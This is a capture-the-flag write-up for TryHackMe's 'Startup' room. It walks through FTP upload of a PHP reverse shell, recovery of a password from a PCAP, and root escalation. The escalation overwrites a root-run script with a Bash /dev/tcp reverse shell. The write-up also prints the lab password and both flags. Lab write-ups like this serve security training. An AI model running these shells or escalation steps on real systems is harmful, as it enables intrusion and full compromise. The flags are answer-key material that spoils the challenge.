# TryHackMe — Startup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Focus](https://img.shields.io/badge/Focus-FTP%20%7C%20Reverse%20Shells%20%7C%20Cron-blue)
![Target](https://img.shields.io/badge/Target-Linux-orange)

## Overview

This write-up documents the **Startup** room on TryHackMe.

The attack path shown in the screenshots:

1.  Enumerate FTP, SSH, and HTTP services.
2.  Log in to FTP anonymously and discover a writable FTP directory.
3.  Enumerate the web server and upload a PHP reverse shell through FTP.
4.  Inspect an incident PCAP and recover Lennie's password.
5.  SSH as `lennie` and inspect the root-owned planner script.
6.  Abuse the writable `/etc/print.sh` script called by the root-owned
    planner to obtain a root shell.


## Attack chain

``` text
Nmap enumeration
      |
      v
Anonymous FTP access
      |
      v
Discover writable /ftp directory
      |
      v
Gobuster finds /files
      |
      v
Upload PHP reverse shell via FTP -> www-data shell
      |
      v
Download /incidents/suspicious.pcapng
      |
      v
Inspect PCAP -> recover Lennie's password
      |
      v
SSH as lennie -> user flag
      |
      v
Root planner.sh executes writable /etc/print.sh
      |
      v
Replace print.sh with reverse shell -> root shell
```

## 1. Enumerate services

Run a service and default-script scan:

``` bash
nmap -sV -sC <TARGET_IP>
```

The scan identifies:

      Port   Service   Finding
    `21/tcp` FTP       vsftpd 3.0.3; anonymous login allowed
    `22/tcp` SSH       OpenSSH 7.2p2 on Ubuntu
    `80/tcp` HTTP      Apache httpd 2.4.18 on Ubuntu

The FTP scan also reports that the `ftp` directory is writable.

<img width="815" height="608" alt="1" src="https://github.com/user-attachments/assets/c1148693-32ba-40d9-a41b-349d0ed2bbf1" />

## 2. Inspect the website

Open the web service:

``` text
http://<TARGET_IP>/
```

The page displays a maintenance message:

> No spice here!

This does not expose a login form, so continue with service and directory enumeration.

<img width="827" height="563" alt="2" src="https://github.com/user-attachments/assets/80685707-47c3-4982-b866-497b41074063" />


## 3. Log in to anonymous FTP

Connect to FTP:

``` bash
ftp <TARGET_IP>
```

Log in with the username `anonymous`. If prompted for a password, press Enter.

``` text
Name: anonymous
Password: [press Enter]
```

List the remote directory:

``` text
ls
```

The server exposes `important.jpg`, `notice.txt`, and a writable `ftp` directory.

<img width="387" height="208" alt="3" src="https://github.com/user-attachments/assets/88b17906-ad97-4b4e-9274-e05a140b7722" />

## 4. Enumerate web directories

Use Gobuster to find additional web paths:

``` bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The scan discovers `/files/`.

<img width="908" height="288" alt="4-4" src="https://github.com/user-attachments/assets/e22d53c4-2bf4-42bc-bc90-0f70eb936bb1" />

Browse to:

``` text
http://<TARGET_IP>/files/
```

The directory listing shows `important.jpg`, `notice.txt`, and an `ftp` directory.

<img width="698" height="365" alt="4-5" src="https://github.com/user-attachments/assets/eadf14de-9e41-49e6-a699-b6f92c628d04" />

Open the FTP-backed web directory:

``` text
http://<TARGET_IP>/files/ftp/
```

This directory is writable over FTP and is served by Apache, making it possible to upload a PHP file and request it through the web server.

<img width="606" height="149" alt="4-3" src="https://github.com/user-attachments/assets/93efc904-8c5f-47a0-94f9-d0de2c8fe3f3" />
<img width="684" height="302" alt="4-6" src="https://github.com/user-attachments/assets/29c89839-2eec-4381-903b-f5baf106de73" />

## 5. Upload a PHP reverse shell

On your attacking machine, prepare a PHP reverse-shell file named `shell.php`. The screenshots show a PHP reverse shell configured with an attacker IP and callback port. Use a trusted local copy of a PHP reverse-shell script and set its callback values to your own lab interface.

Example configuration inside the PHP script:

``` php
$ip = "<YOUR_TUN0_IP>";
$port = 4444;
```

<img width="839" height="483" alt="4-2" src="https://github.com/user-attachments/assets/5e88cda3-0e7f-4504-bd04-1062cc583da2" />

Connect to FTP and change into the writable directory:

``` text
cd ftp
put shell.php
```

<img width="415" height="120" alt="4-3-2" src="https://github.com/user-attachments/assets/2cedd5f9-c597-4fd9-85dc-3ce768dccab9" />

Start a Netcat listener on the same port configured in the PHP script:

``` bash
nc -lvnp 4444
```

Then request the uploaded script in a browser:

``` text
http://<TARGET_IP>/files/ftp/shell.php
```

The screenshots show the incoming connection and a shell running as `www-data`.

<img width="1273" height="352" alt="4-7" src="https://github.com/user-attachments/assets/edd209b6-7f69-4b73-9905-f9102bad617b" />


## 6. Explore the initial shell

From the `www-data` shell, inspect `/home`:

``` bash
cd /home
ls
```

The screenshot shows a home directory named `lennie`. Direct access is denied:

``` bash
cd lennie
```

<img width="365" height="147" alt="5" src="https://github.com/user-attachments/assets/3f3d5454-4fde-48e7-a7d5-8bfbcc699b93" />

List the filesystem root and inspect `/incidents`:

``` bash
cd /
ls
cd /incidents
ls
```

The directory contains:

``` text
suspicious.pcapng
```

<img width="377" height="621" alt="6" src="https://github.com/user-attachments/assets/7cc63a35-51f7-4b08-a08c-a12560b29797" />

## 7. Transfer and analyze the incident PCAP

Start a temporary HTTP server from `/incidents` in the target shell:

``` bash
cd /incidents
python3 -m http.server 1234
```

<img width="467" height="43" alt="7-1" src="https://github.com/user-attachments/assets/15a6f856-6506-40c9-88a8-dcc4af7adeba" />

From your attacking machine, download the capture:

``` bash
wget http://<TARGET_IP>:1234/suspicious.pcapng
```

<img width="602" height="273" alt="7-2" src="https://github.com/user-attachments/assets/89d2b67d-82b8-48cf-bf61-c78efbab71f7" />

Open `suspicious.pcapng` in Wireshark. Follow the relevant TCP stream and inspect the captured data. The screenshot shows a password being entered during failed `sudo` attempts for `www-data`.

The recovered password is:

``` text
c4ntg3t3n0ughspic3
```

<img width="903" height="467" alt="8" src="https://github.com/user-attachments/assets/77939682-1522-4d3b-b3ca-892a6a460491" />

## 8. SSH as `lennie`

Use the recovered password to connect over SSH:

``` bash
ssh lennie@<TARGET_IP>
```

<img width="734" height="514" alt="9" src="https://github.com/user-attachments/assets/9a6c0097-e7ee-4875-a8ab-5b58aaecc97a" />

List the home directory and read the user flag:

``` bash
ls
cat user.txt
```

The user flag shown in the screenshot is:

``` text
THM{03ce3d619b80ccbf3b7fcb81e46c0e79}
```

<img width="314" height="88" alt="10" src="https://github.com/user-attachments/assets/0b215b75-1381-499f-9ed7-bdb320e4572a" />

## 9. Inspect the scheduled script

Navigate to Lennie's `scripts` directory and inspect the files:

``` bash
cd ~/scripts
ls -la
cat planner.sh
```

The screenshot shows `planner.sh` owned by root and containing:

``` bash
#!/bin/bash

echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

The planner invokes `/etc/print.sh`. If that script is writable by Lennie and the planner runs with root privileges, changing it can lead to privilege escalation.

<img width="537" height="178" alt="11" src="https://github.com/user-attachments/assets/3320f905-7a53-48e1-84f1-34d268da7819" />

Check the permissions on the called script:

``` bash
ls -la /etc/print.sh
```

The screenshot shows that `/etc/print.sh` is writable by `lennie`.

<img width="472" height="41" alt="12" src="https://github.com/user-attachments/assets/c2836552-3c6d-49fd-8627-cdeddbd3f4af" />

## 10. Replace `/etc/print.sh` with a reverse shell

Edit `/etc/print.sh` and replace its contents with a Bash reverse shell that connects to your attack machine. The screenshot shows a payload configured for callback port `4848`.

Example payload:

``` bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_TUN0_IP>/4848 0>&1
echo "Done"
```

<img width="547" height="89" alt="13" src="https://github.com/user-attachments/assets/e11e2e61-5e6b-4c66-8ba2-70212c87a847" />


## 11. Catch the root shell

Start the listener:

``` bash
nc -lvnp 4848
```

Wait for the root-owned scheduled task to execute the modified script.
The screenshot shows a shell prompt as `root`.

<img width="684" height="188" alt="14" src="https://github.com/user-attachments/assets/8109cd83-f3df-4269-93e7-48f68151d061" />

Verify the effective identity:

``` bash
id
```

The output shown in the screenshot is:

``` text
uid=0(root) gid=0(root) groups=0(root)
```

## 12. Retrieve the root flag

From the root shell, read the flag:

``` bash
ls
cat root.txt
```

The root flag shown in the screenshot is:

``` text
THM{f963aaa6a430f210222158ae15c3d76d}
```

<img width="367" height="158" alt="15" src="https://github.com/user-attachments/assets/99f53b11-4059-4d5c-8d9a-a44be8cbabe3" />

## Flags

  User   `THM{03ce3d619b80ccbf3b7fcb81e46c0e79}`
  Root   `THM{f963aaa6a430f210222158ae15c3d76d}`
